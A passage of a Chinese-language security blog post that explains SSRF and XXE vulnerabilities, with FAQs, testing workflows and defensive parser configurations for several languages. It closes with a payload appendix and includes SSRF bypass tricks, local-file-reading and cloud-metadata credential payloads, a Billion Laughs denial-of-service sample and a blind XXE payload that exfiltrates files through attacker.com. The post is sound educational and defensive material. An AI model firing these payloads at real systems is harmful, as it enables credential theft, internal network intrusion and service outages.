+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">lolz</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol</span> <span class="string">&quot;lol&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol2</span> <span class="string">&quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol3</span> <span class="string">&quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  ...</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;lol999;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>利用实体嵌套指数级扩展内存，耗尽服务器资源。</p>
+<h3 id="34-做-xxe-题时的三步确认"><a class="markdownIt-Anchor" href="#34-做-xxe-题时的三步确认"></a> 3.4 做 XXE 题时的三步确认</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">步骤</th>
+<th style="text-align:left">确认内容</th>
+<th style="text-align:left">方法</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">第一步</td>
+<td style="text-align:left">服务端是否真的在解析 XML？</td>
+<td style="text-align:left">提交简单 XML，观察是否正常处理</td>
+</tr>
+<tr>
+<td style="text-align:left">第二步</td>
+<td style="text-align:left">是否允许 DOCTYPE 和外部实体？</td>
+<td style="text-align:left">定义简单实体并引用，看是否被替换</td>
+</tr>
+<tr>
+<td style="text-align:left">第三步</td>
+<td style="text-align:left">解析后的内容会出现在哪里？</td>
+<td style="text-align:left">直接回显 → 有回显 XXE；不直接回显 → Blind XXE</td>
+</tr>
+</tbody>
+</table>
+<h3 id="35-xxe-防御方案"><a class="markdownIt-Anchor" href="#35-xxe-防御方案"></a> 3.5 XXE 防御方案</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">优先级</th>
+<th style="text-align:left">防御措施</th>
+<th style="text-align:left">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">第一</td>
+<td style="text-align:left">禁用外部实体解析</td>
+<td style="text-align:left">最核心的防御</td>
+</tr>
+<tr>
+<td style="text-align:left">第二</td>
+<td style="text-align:left">禁用 DOCTYPE</td>
+<td style="text-align:left">从源头禁止 DTD 定义</td>
+</tr>
+<tr>
+<td style="text-align:left">第三</td>
+<td style="text-align:left">使用安全配置的解析器</td>
+<td style="text-align:left">各语言框架的正确配置</td>
+</tr>
+<tr>
+<td style="text-align:left">第四</td>
+<td style="text-align:left">不处理不可信的 XML</td>
+<td style="text-align:left">用 JSON 等格式替代</td>
+</tr>
+<tr>
+<td style="text-align:left">第五</td>
+<td style="text-align:left">对上传文件进行安全检查</td>
+<td style="text-align:left">SVG、Office 文件扫描</td>
+</tr>
+</tbody>
+</table>
+<p><strong>各语言安全配置示例：</strong></p>
+<p><strong>PHP：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
+<p><strong>Python（lxml）：</strong></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">parser = etree.XMLParser(resolve_entities=<span class="literal">False</span>, no_network=<span class="literal">True</span>, forbid_dtd=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+<p><strong>Java：</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span> DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setFeature(<span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">dbf.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">dbf.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
+<p><strong>.NET：</strong></p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">XmlReaderSettings settings = <span class="keyword">new</span> XmlReaderSettings();</span><br><span class="line">settings.DtdProcessing = DtdProcessing.Prohibit;</span><br></pre></td></tr></table></figure>
+<h2 id="四-常见问题"><a class="markdownIt-Anchor" href="#四-常见问题"></a> 四、常见问题</h2>
+<h3 id="41-基础概念问题"><a class="markdownIt-Anchor" href="#41-基础概念问题"></a> 4.1 基础概念问题</h3>
+<p><strong>Q: SSRF 为什么是&quot;借服务器访问资源&quot;？</strong></p>
+<p>因为 SSRF 是利用服务器的网络权限去发起请求。服务器通常能访问内网、本机服务等用户无法直接访问的资源，攻击者通过控制 URL 参数，让服务器替自己去访问这些资源。</p>
+<p><strong>Q: SSRF 有回显和无回显有什么区别？</strong></p>
+<ul>
+<li>有回显：服务器请求的内容直接返回在响应中，可以直接读取数据</li>
+<li>无回显：页面不返回内容，需要通过响应时间、状态码、DNS 日志等间接判断</li>
+</ul>
+<p><strong>Q: XXE 中的实体是什么？</strong></p>
+<p>实体是 XML 中的&quot;宏&quot;或&quot;变量&quot;，用 <code>&amp;实体名;</code> 引用，解析时会替换成定义的内容。外部实体可以引用外部资源（如本地文件、URL）。</p>
+<p><strong>Q: 为什么 XML 解析器可能读取本地文件或访问网络？</strong></p>
+<p>因为 XML 标准支持外部实体（SYSTEM 关键字），如果解析器没有禁用这个功能，当解析到 <code>&lt;!ENTITY name SYSTEM &quot;file:///etc/passwd&quot;&gt;</code> 时，就会去读取文件。</p>
+<h3 id="42-检查与绕过问题"><a class="markdownIt-Anchor" href="#42-检查与绕过问题"></a> 4.2 检查与绕过问题</h3>
+<p><strong>Q: URL 过滤为什么不能只靠字符串匹配？</strong></p>
+<p>因为同一个地址可以有无数种写法。例如 <code>127.0.0.1</code> 可以写成 <code>127.1</code>、<code>2130706433</code>、<code>0x7F000001</code>，还可以用域名解析到内网地址。字符串匹配很容易被绕过。</p>
+<p><strong>Q: SSRF 中的重定向如何导致绕过？</strong></p>
+<p>如果服务端只检查了初始 URL，但 HTTP 客户端自动跟随重定向，攻击者可以：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">初始 URL: http://evil.com/redirect（通过检查）</span><br><span class="line">重定向到: http://127.0.0.1/admin（未检查，直接访问）</span><br></pre></td></tr></table></figure>
+<p><strong>Q: XXE 为什么可能造成 SSRF？</strong></p>
+<p>因为 XXE 的外部实体可以指定为一个 URL（如 <code>http://169.254.169.254/latest/meta-data/</code>），解析器访问这个 URL 时，就触发了 SSRF。所以 XXE 不仅可以读文件，也可以让服务器访问内网资源。</p>
+<h3 id="43-利用链问题"><a class="markdownIt-Anchor" href="#43-利用链问题"></a> 4.3 利用链问题</h3>
+<p><strong>Q: SSRF 的核心问题清单是什么？</strong></p>
+<ol>
+<li>服务器能访问哪些用户无法直接访问的地址？</li>
+<li>能否访问本机服务？</li>
+<li>能否访问内网服务？</li>
+<li>返回内容会不会显示在页面上？</li>
+<li>即使没有回显，能否通过其他方式判断？</li>
+<li>服务器支持哪些协议？</li>
+</ol>
+<p><strong>Q: 为什么 XXE 带外攻击需要两个步骤？</strong></p>
+<p>因为参数实体（<code>%file</code>）的值无法直接在同一个文档中通过 HTTP 发送出去（某些 XML 解析器的限制）。所以需要：</p>
+<ol>
+<li>先加载外部 DTD（<code>%dtd</code>）</li>
+<li>在外部 DTD 中再发请求（<code>%send</code>），携带文件内容</li>
+</ol>
+<h3 id="44-防御问题"><a class="markdownIt-Anchor" href="#44-防御问题"></a> 4.4 防御问题</h3>
+<p><strong>Q: SSRF 和 XXE 分别应该如何防御？</strong></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">漏洞</th>
+<th style="text-align:left">核心防御</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">SSRF</td>
+<td style="text-align:left">白名单 + 网络隔离，不让用户控制完整 URL</td>
+</tr>
+<tr>
+<td style="text-align:left">XXE</td>
+<td style="text-align:left">禁用外部实体解析，禁用 DOCTYPE</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Q: 为什么不能只靠一道过滤规则？</strong></p>
+<p>SSRF 需要多层防御：协议限制、域名白名单、端口白名单、内网 IP 黑名单、重定向检查。</p>
+<p>XXE 也需要多层防御：禁用外部实体、禁用 DTD、使用安全解析器配置。</p>
+<p>纵深防御原则：任何一道防线都可能被绕过，多层检查提高安全性。</p>
+<h2 id="五-实战总结"><a class="markdownIt-Anchor" href="#五-实战总结"></a> 五、实战总结</h2>
+<h3 id="51-ssrf-测试流程"><a class="markdownIt-Anchor" href="#51-ssrf-测试流程"></a> 5.1 SSRF 测试流程</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">第一步：确认输入点</span><br><span class="line">    └─ URL 参数、API 地址字段、回调地址等</span><br><span class="line"></span><br><span class="line">第二步：测试基础连通性</span><br><span class="line">    └─ 请求自己的服务器，查看访问日志</span><br><span class="line"></span><br><span class="line">第三步：探测本机地址</span><br><span class="line">    └─ 127.0.0.1, localhost, 0.0.0.0, [::1]</span><br><span class="line"></span><br><span class="line">第四步：探测内网地址</span><br><span class="line">    └─ 192.168.x.x, 10.x.x.x, 172.16.x.x</span><br><span class="line"></span><br><span class="line">第五步：探测端口服务</span><br><span class="line">    └─ 22, 3306, 6379, 9200, 8080, 8888</span><br><span class="line"></span><br><span class="line">第六步：测试云元数据</span><br><span class="line">    └─ 169.254.169.254 及相关路径</span><br><span class="line"></span><br><span class="line">第七步：尝试协议拓展</span><br><span class="line">    └─ file://, dict://, gopher://</span><br><span class="line"></span><br><span class="line">第八步：绕过过滤</span><br><span class="line">    └─ IP编码、域名解析、重定向、URL解析差异</span><br></pre></td></tr></table></figure>
+<h3 id="52-xxe-测试流程"><a class="markdownIt-Anchor" href="#52-xxe-测试流程"></a> 5.2 XXE 测试流程</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">第一步：确认 XML 解析</span><br><span class="line">    └─ 提交简单 XML，观察是否正常处理</span><br><span class="line"></span><br><span class="line">第二步：测试实体解析</span><br><span class="line">    └─ 定义内部实体并引用，看是否被替换</span><br><span class="line"></span><br><span class="line">第三步：判断是否有回显</span><br><span class="line">    ├─ 有回显 → 直接读文件（file:///etc/passwd）</span><br><span class="line">    └─ 无回显 → 尝试 Blind XXE（带外通道）</span><br><span class="line"></span><br><span class="line">第四步：尝试 SSRF</span><br><span class="line">    └─ 访问内网地址、云元数据</span><br><span class="line"></span><br><span class="line">第五步：扩展攻击面</span><br><span class="line">    └─ 结合其他漏洞（如文件上传、RCE）</span><br></pre></td></tr></table></figure>
+<h3 id="53-不同检查的应对策略"><a class="markdownIt-Anchor" href="#53-不同检查的应对策略"></a> 5.3 不同检查的应对策略</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">场景</th>
+<th style="text-align:left">应对方法</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">SSRF 字符串过滤</td>
+<td style="text-align:left">尝试不同 IP 表示法、域名解析、URL 解析差异</td>
+</tr>
+<tr>
+<td style="text-align:left">SSRF 协议限制</td>
+<td style="text-align:left">尝试其他协议（dict://、gopher://）</td>
+</tr>
+<tr>
+<td style="text-align:left">SSRF 重定向检查</td>
+<td style="text-align:left">检查是否跟随重定向，或使用其他方式绕过</td>
+</tr>
+<tr>
+<td style="text-align:left">XXE 无回显</td>
+<td style="text-align:left">使用 Blind XXE 带外通道（HTTP/DNS）</td>
+</tr>
+<tr>
+<td style="text-align:left">XXE 部分禁用</td>
+<td style="text-align:left">尝试参数实体、外部 DTD 加载</td>
+</tr>
+</tbody>
+</table>
+<h2 id="六-拓展内容"><a class="markdownIt-Anchor" href="#六-拓展内容"></a> 六、拓展内容</h2>
+<h3 id="61-ssrf-进阶绕过技巧"><a class="markdownIt-Anchor" href="#61-ssrf-进阶绕过技巧"></a> 6.1 SSRF 进阶绕过技巧</h3>
+<p><strong>1. DNS 重绑定（DNS Rebinding）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 域名 example.com 解析到公网 IP（通过检查）</span><br><span class="line">2. 第二次解析时返回内网 IP（绕过后访问内网）</span><br></pre></td></tr></table></figure>
+<p>ps：好神奇</p>
+<p>二编：（系统学习一段时间后补充的，之前只做了简单的了解）</p>
+<p>这里是参考资料：</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/7091">从0到1认识DNS重绑定攻击-先知社区</a></p>
+<p>总的来说，在了解DNS重绑定机制之前，我们得先认识DNS、DNS记录类型、DNS绑定技术以及<strong>DNS TTL</strong>（这里标了重点哦！！</p>
+<p><strong>DNS的记录类型</strong></p>
+<blockquote>
+<ul>
+<li>主机记录（A记录）：A记录是用于名称解析的重要记录，它将特定的主机名映射到对应的主机IP上</li>
+<li>别名记录（CNAME记录）：CNAME记录用于将某个别名指向到某个A记录上，这就不需要再为某个新名字创建一条新纪录。</li>
+</ul>
+</blockquote>
+<p>而DNS重绑定攻击就是建立在DNS绑定技术上出现的，</p>
+<p>这里简要说点DNS绑定技术的主要内容：</p>
+<p>(1)DNS区域是一个层次结构的空间, 根域名服务器-&gt;子域名服务器-&gt;二代子域名服务器</p>
+<p>(2)DNS查询方式：<strong>递归</strong>和<strong>迭代</strong></p>
+<p>这里只阐述核心内容（毕竟不是这个文章的中心内容emmmmmm</p>
+<p>DNS Rebinding出现的根本原因，在于 浏览器同源策略只检查域名，不检查 IP，而 DNS 解析结果又是可以动态变化的。攻击者正好利用这两点之间的缝隙，绕过同源策略，访问你内网里的设备。</p>
+<p>而TTL之所以重要，是因为它代表了浏览器多久重新解析一次页面内容，倘若TTL过长，攻击者的恶意js无法及时被触发，导致攻击过程被延长，倘若DNS TTL被设置为0或者很短的时间，那么攻击者就可以在浏览器二次解析之前替换掉请求的IP为内网，通过攻击者服务器内部恶意js脚本，通过img，fetch等读取受害者内网响应的内容。</p>
+<p><strong>2. 编码绕过</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/           # 标准</span><br><span class="line">http://%31%32%37%2e%30%2e%30%2e%31/  # URL 编码</span><br></pre></td></tr></table></figure>
+<p><strong>3. 短网址绕过</strong></p>
+<p>使用短网址服务将内网地址伪装成公网短链接。</p>
+<p><strong>4. 利用 URL 解析库差异</strong></p>
+<p>不同语言对 URL 的解析方式不同，可能导致检查与访问不一致。</p>
+<h3 id="62-xxe-进阶技巧"><a class="markdownIt-Anchor" href="#62-xxe-进阶技巧"></a> 6.2 XXE 进阶技巧</h3>
+<p><strong>1. 利用 SVG 上传触发 XXE</strong></p>
+<p>SVG 本质是 XML，上传 SVG 头像时可能触发 XXE：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">svg</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">&quot;100&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;10&quot;</span> <span class="attr">y</span>=<span class="string">&quot;20&quot;</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>2. 利用 Office 文档触发 XXE</strong></p>
+<p>docx/xlsx 文件本质是 ZIP 压缩包，包含 XML 文件。可以在 XML 中注入外部实体。</p>
+<p><strong>3. 利用 XInclude 绕过</strong></p>
+<p>即使 DOCTYPE 被禁用，XInclude 也可能读取文件：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">foo</span> <span class="attr">xmlns:xi</span>=<span class="string">&quot;http://www.w3.org/2001/XInclude&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">href</span>=<span class="string">&quot;file:///etc/passwd&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="63-防御加固方案"><a class="markdownIt-Anchor" href="#63-防御加固方案"></a> 6.3 防御加固方案</h3>
+<p><strong>SSRF 加固：</strong></p>
+<ol>
+<li>使用 URL 解析库规范化 URL，提取真实主机名</li>
+<li>对主机名进行 DNS 解析，检查是否为内网 IP</li>
+<li>设置合理的超时时间，防止慢速攻击</li>
+<li>限制 HTTP 请求的响应大小</li>
+</ol>
+<p><strong>XXE 加固：</strong></p>
+<ol>
+<li>升级 XML 解析库到最新版本</li>
+<li>使用安全的解析器配置（禁用 DTD 和外部实体）</li>
+<li>如果业务不需要 XML，改用 JSON</li>
+<li>对上传的 SVG/Office 文件进行内容扫描</li>
+</ol>
+<h3 id="64-快速自检"><a class="markdownIt-Anchor" href="#64-快速自检"></a> 6.4 快速自检</h3>
+<p>SSRF 为什么是&quot;借服务器访问资源&quot;？</p>
+<p>SSRF 有回显和无回显有什么区别？</p>
+<p>URL 过滤为什么不能只靠字符串匹配？</p>
+<p>XXE 中的实体是什么？</p>
+<p>为什么 XML 解析器可能读取本地文件或访问网络？</p>
+<p>XXE 为什么可能造成 SSRF？</p>
+<p>SSRF 和 XXE 分别应该如何防御？</p>
+<p>SSRF 常见的攻击目标有哪些？</p>
+<p>Blind XXE 如何利用带外通道窃取数据？</p>
+<p>SSRF 的 DNS 重绑定攻击是什么？</p>
+<h2 id="附录常用-payload-集合"><a class="markdownIt-Anchor" href="#附录常用-payload-集合"></a> 附录：常用 Payload 集合</h2>
+<h3 id="ssrf-常用-payload"><a class="markdownIt-Anchor" href="#ssrf-常用-payload"></a> SSRF 常用 Payload</h3>
+<p><strong>1. 本机地址探测</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/</span><br><span class="line">http://localhost/</span><br><span class="line">http://0.0.0.0/</span><br><span class="line">http://[::1]/</span><br></pre></td></tr></table></figure>
+<p><strong>2. 内网地址扫描</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.1/</span><br><span class="line">http://192.168.1.1:8080/</span><br><span class="line">http://10.0.0.1/</span><br><span class="line">http://172.16.0.1/</span><br></pre></td></tr></table></figure>
+<p><strong>3. 云元数据</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://169.254.169.254/latest/meta-data/</span><br><span class="line">http://169.254.169.254/latest/user-data/</span><br><span class="line">http://169.254.169.254/latest/meta-data/iam/security-credentials/admin</span><br></pre></td></tr></table></figure>
+<p><strong>4. 文件协议</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file:///etc/passwd</span><br><span class="line">file:///etc/hosts</span><br><span class="line">file:///proc/self/environ</span><br></pre></td></tr></table></figure>
+<p><strong>5. 不同 IP 表示法</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/</span><br><span class="line">http://127.1/</span><br><span class="line">http://2130706433/</span><br><span class="line">http://0x7F000001/</span><br><span class="line">http://017700000001/</span><br></pre></td></tr></table></figure>
+<h3 id="xxe-常用-payload"><a class="markdownIt-Anchor" href="#xxe-常用-payload"></a> XXE 常用 Payload</h3>
+<p><strong>1. 读取本地文件</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>2. 读取 Windows 文件</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///C:/windows/win.ini&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>3. SSRF（访问内网）</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://169.254.169.254/latest/meta-data/&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>4. Blind XXE（带外）</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://attacker.com/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  %dtd;</span></span><br><span class="line"><span class="meta">  %send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>test<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>5. 拒绝服务（Billion Laughs）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE lolz [</span><br><span class="line">  &lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;</span><br><span class="line">  ...</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&amp;lol999;&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+
+    </div>
+    <footer class="article-footer">
+        <blockquote class="article-copyright">
+    <p><strong><span class="icon-user icon"></span>Author: </strong>Cl1ck-t0</p>
+    <p><strong><span class="icon-link icon"></span>Permalink: </strong><a href="https://cl1ck-t0.github.io/2026/08/22/SSRF-XXE%E6%BC%8F%E6%B4%9E/">https://cl1ck-t0.github.io/2026/08/22/SSRF-XXE%E6%BC%8F%E6%B4%9E/</a></p>
+    
+    <p><strong><span class="icon-calendar icon"></span>Published: </strong>2026-08-22 16:25:07</p>
+    <p><strong><span class="icon-calendar icon"></span>Updated: </strong>2026-09-16 22:49:09</p>
+    <p><strong><span class="icon-copyright icon"></span>License: </strong>All articles on this blog are licensed under the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener nofollow noreferrer" target="_blank"><span class="icon-creative-commons"></span>BY-NC-SA</a> license agreement unless otherwise stated. Please indicate the source when reprinting!</p>
+    <span class="icon-creative-commons article-copyright-bg"></span>
+  </blockquote>
+        <div class="share-wrapper">
+    <a href="https://service.weibo.com/share/share.php?url=https%3A%2F%2Fcl1ck-t0.github.io%2F2026%2F08%2F22%2FSSRF-XXE%25E6%25BC%258F%25E6%25B4%259E%2F&amp;appkey=&amp;title=SSRF%26XXE%E6%BC%8F%E6%B4%9E&amp;pic=&amp;ralateUid=" target="_blank" rel="noopener noreferrer" title="SSRF&amp;XXE漏洞">
+      <div class="share-icon icon icon-weibo">
+      </div>
+    </a>
+    <a href="https://connect.qq.com/widget/shareqq/index.html?url=www.baidu.com&amp;title=SSRF%26XXE%E6%BC%8F%E6%B4%9E&amp;desc=SSRF%26XXE%E6%BC%8F%E6%B4%9E&amp;source=https%3A%2F%2Fcl1ck-t0.github.io" target="_blank" rel="noopener noreferrer" title="SSRF&amp;XXE漏洞">
+      <div class="share-icon icon icon-qq">
+      </div>
+    </a>
+    <a href="javascript:;"  title="SSRF&amp;XXE漏洞">
+      <div class="share-icon icon icon-weixin">
+          <div id="share-weixin">
+            <div class="share-weixin-dom">
+              <div class="share-weixin-content">
+                <img id="share-weixin-banner"> 
+                <div id="share-weixin-title"></div>
+                <div id="share-weixin-desc"></div>
+              </div>
